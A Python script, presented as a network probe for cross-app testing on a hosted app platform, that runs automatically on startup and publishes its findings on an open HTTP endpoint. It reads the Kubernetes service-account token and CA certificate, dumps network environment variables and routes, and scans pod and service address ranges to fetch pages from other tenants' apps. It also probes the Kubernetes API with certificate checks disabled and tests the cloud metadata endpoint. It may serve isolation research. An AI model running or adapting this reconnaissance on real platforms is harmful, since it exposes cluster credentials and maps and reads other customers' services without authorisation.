"""
Runtime network probe for App Platform cross-app testing.
Serves probe results on HTTP and runs network discovery on startup.
"""
import json, os, socket, time, urllib.request, urllib.error, ssl, re, threading
from http.server import HTTPServer, BaseHTTPRequestHandler

results = {"status": "probing..."}

def run_probe():
    global results
    r = {}

    # 1. Runtime identity
    r['runtime'] = {
        'uid': os.getuid(),
        'hostname': socket.gethostname(),
        'pid': os.getpid(),
    }

    # Network env vars
    env_keys = {}
    for k, v in os.environ.items():
        if any(x in k.upper() for x in ['KUBE', 'SERVICE', 'HOST', 'PORT', 'IP', 'DNS', 'CLUSTER', 'POD', 'NODE', 'NET', 'DIGITAL', 'APP']):
            env_keys[k] = v[:200]
    r['network_env'] = env_keys

    # 2. Own IPs + routes
    import subprocess as sp
    try:
        out = sp.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
        r['ip_addr'] = out.stdout[:2000]
    except Exception as e:
        r['ip_addr_err'] = str(e)
    try:
        out = sp.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
        r['routes'] = out.stdout[:1000]
    except:
        pass
    try:
        r['resolv_conf'] = open('/etc/resolv.conf').read()[:500]
    except:
        pass

    # 3. Namespace / SA token
    r['k8s'] = {}
    for f in ['namespace', 'token', 'ca.crt']:
        path = f'/var/run/secrets/kubernetes.io/serviceaccount/{f}'
        try:
            data = open(path).read()
            if f == 'token':
                r['k8s'][f] = data[:50] + '...' if len(data) > 50 else data
            else:
                r['k8s'][f] = data[:500]
        except Exception as e:
            r['k8s'][f] = str(e)[:100]

    # 4. DNS resolution
    r['dns'] = {}
    dns_targets = [
        'kubernetes.default.svc.cluster.local',
        'kube-dns.kube-system.svc.cluster.local',
    ]
    for target in dns_targets:
        try:
            r['dns'][target] = [str(x[4]) for x in socket.getaddrinfo(target, None)][:3]
        except Exception as e:
            r['dns'][target] = str(e)[:100]

    # 5. Quick connect helper
    def qc(ip, port, timeout=1.5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            return result
        except:
            return -1

    # 6. Pod CIDR scan (10.244.x.x) — look for other apps
    r['pod_scan'] = {}
    ports = [8080, 80, 443, 3000, 5000]
    for sub in range(0, 15):
        for host in [1, 2, 3, 4, 5, 10, 20, 50, 100, 150, 200, 250]:
            ip = f'10.244.{sub}.{host}'
            for port in ports:
                rc = qc(ip, port, timeout=0.5)
                if rc == 0:
                    r['pod_scan'][f'{ip}:{port}'] = 'OPEN'
                    # Try HTTP fetch
                    try:
                        resp = urllib.request.urlopen(f'http://{ip}:{port}/', timeout=3)
                        body = resp.read().decode(errors='replace')[:500]
                        hdrs = dict(resp.headers)
                        r['pod_scan'][f'{ip}:{port}_resp'] = {'body': body, 'headers': hdrs}
                    except Exception as e:
                        r['pod_scan'][f'{ip}:{port}_err'] = str(e)[:200]

    # 7. Service CIDR scan (10.245.x.x)
    r['svc_scan'] = {}
    for host in range(1, 30):
        ip = f'10.245.0.{host}'
        for port in [443, 80, 8080, 53]:
            rc = qc(ip, port, timeout=0.5)
            if rc == 0:
                r['svc_scan'][f'{ip}:{port}'] = 'OPEN'

    # Also scan 10.245.{1-5}.x
    for sub in range(1, 6):
        for host in [1, 10, 50, 100, 150, 200]:
            ip = f'10.245.{sub}.{host}'
            for port in [80, 443, 8080]:
                rc = qc(ip, port, timeout=0.5)
                if rc == 0:
                    r['svc_scan'][f'{ip}:{port}'] = 'OPEN'

    # 8. /proc/net/tcp
    r['connections'] = {}
    try:
        tcp = open('/proc/net/tcp').read()
        r['connections']['tcp_lines'] = len(tcp.strip().split('\n'))
        r['connections']['tcp'] = tcp[:2000]
    except:
        pass

    # 9. Try to reach the K8s API
    r['k8s_api'] = {}
    rc = qc('10.245.0.1', 443, timeout=2)
    r['k8s_api']['connect'] = f'errno={rc}'
    if rc == 0:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request('https://10.245.0.1:443/version')
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            r['k8s_api']['version'] = resp.read().decode()[:500]
        except Exception as e:
            r['k8s_api']['err'] = str(e)[:200]

    # 10. Try IMDS
    r['imds'] = {}
    rc = qc('169.254.169.254', 80, timeout=2)
    r['imds']['connect'] = f'errno={rc}'

    # 11. Internal DO ranges
    r['internal'] = {}
    for ip in ['10.116.0.1', '10.116.0.2', '10.116.0.3', '100.65.67.229', '10.10.0.5']:
        rc = qc(ip, 443, timeout=1)
        r['internal'][f'{ip}:443'] = f'errno={rc}'

    results = r

# Run probe in background thread
t = threading.Thread(target=run_probe, daemon=True)
t.start()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, format, *args):
        pass

port = int(os.environ.get('PORT', 8080))
HTTPServer(("0.0.0.0", port), H).serve_forever()
